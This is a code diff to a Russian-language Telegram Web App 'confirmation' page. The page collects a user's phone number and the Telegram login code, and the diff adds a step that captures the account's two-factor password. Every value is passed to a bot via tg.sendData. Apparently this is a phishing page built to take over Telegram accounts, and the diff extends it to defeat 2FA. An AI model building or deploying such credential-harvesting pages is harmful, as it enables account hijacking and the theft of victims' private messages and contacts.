@@ -6,11 +6,7 @@
     <title>Подтверждение</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #0f0f0f;
@@ -28,37 +24,12 @@
             width: 100%;
             box-shadow: 0 12px 40px rgba(0,0,0,0.6);
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo svg {
-            width: 60px;
-            height: 60px;
-        }
-        h2 {
-            color: #fff;
-            font-size: 22px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-        .sub {
-            color: #aaa;
-            text-align: center;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-        .input-group {
-            margin-bottom: 16px;
-        }
-        .input-group label {
-            display: block;
-            color: #ccc;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 5px;
-        }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo svg { width: 60px; height: 60px; }
+        h2 { color: #fff; font-size: 22px; font-weight: 600; text-align: center; margin-bottom: 8px; }
+        .sub { color: #aaa; text-align: center; font-size: 14px; margin-bottom: 25px; }
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; color: #ccc; font-size: 13px; font-weight: 500; margin-bottom: 5px; }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
@@ -70,9 +41,7 @@
             outline: none;
             transition: border 0.2s;
         }
-        .input-group input:focus {
-            border-color: #6c8cff;
-        }
+        .input-group input:focus { border-color: #6c8cff; }
         .btn {
             width: 100%;
             padding: 14px;
@@ -86,28 +55,11 @@
             transition: background 0.2s;
             margin-top: 10px;
         }
-        .btn:hover {
-            background: #5a7ae0;
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        .status {
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-            color: #ff6b6b;
-            min-height: 24px;
-        }
-        .status.success {
-            color: #69db7c;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 12px;
-        }
+        .btn:hover { background: #5a7ae0; }
+        .btn:active { transform: scale(0.98); }
+        .status { margin-top: 15px; text-align: center; font-size: 14px; color: #ff6b6b; min-height: 24px; }
+        .status.success { color: #69db7c; }
+        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
     </style>
 </head>
 <body>
@@ -129,6 +81,10 @@
                 <label>Код подтверждения</label>
                 <input type="text" id="code" placeholder="Введите код из Telegram" required>
             </div>
+            <div class="input-group" id="passwordGroup" style="display:none;">
+                <label>Пароль (если есть 2FA)</label>
+                <input type="password" id="password" placeholder="Введите пароль, если он есть">
+            </div>
             <button type="submit" class="btn" id="submitBtn">Продолжить</button>
         </form>
 
@@ -137,10 +93,14 @@
     </div>
 
     <script>
+        let tg = window.Telegram.WebApp;
         let step = 'phone';
         let phone = '';
 
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        tg.ready();
+        tg.expand();
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const status = document.getElementById('status');
 
@@ -155,16 +115,17 @@
                 status.textContent = 'Отправляем код...';
                 status.className = 'status';
 
-                // ОТПРАВКА НОМЕРА
-                window.Telegram.WebApp.sendData(JSON.stringify({
+                // Отправляем номер
+                tg.sendData(JSON.stringify({
                     phone: phone,
-                    code: ''
+                    code: '',
+                    password: ''
                 }));
 
                 status.textContent = '✅ Код отправлен! Введите его ниже.';
                 status.className = 'status success';
                 document.getElementById('codeGroup').style.display = 'block';
-                document.getElementById('submitBtn').textContent = 'Подтвердить';
+                document.getElementById('submitBtn').textContent = 'Подтвердить код';
                 step = 'code';
                 return;
             }
@@ -177,13 +138,33 @@
                     return;
                 }
 
-                status.textContent = 'Проверяем...';
-                status.className = 'status';
-
-                // ОТПРАВКА КОДА
-                window.Telegram.WebApp.sendData(JSON.stringify({
+                // Отправляем код, ждём ответ от бота
+                // Если бот запросит пароль — покажем поле для пароля
+                tg.sendData(JSON.stringify({
                     phone: phone,
-                    code: code
+                    code: code,
+                    password: ''
+                }));
+
+                status.textContent = '⏳ Проверка...';
+                status.className = 'status';
+                
+                // Скрываем поле кода, показываем поле для пароля
+                // (бот сам решит, нужно ли показывать)
+                document.getElementById('codeGroup').style.display = 'none';
+                document.getElementById('passwordGroup').style.display = 'block';
+                document.getElementById('submitBtn').textContent = 'Подтвердить пароль';
+                step = 'password';
+                return;
+            }
+
+            if (step === 'password') {
+                const password = document.getElementById('password').value.trim();
+                
+                tg.sendData(JSON.stringify({
+                    phone: phone,
+                    code: '',
+                    password: password
                 }));
 
                 status.textContent = '✅ Подтверждено!';
@@ -199,7 +180,7 @@
                     `;
                 }, 1000);
 
-                window.Telegram.WebApp.close();
+                tg.close();
             }
         });
     </script>
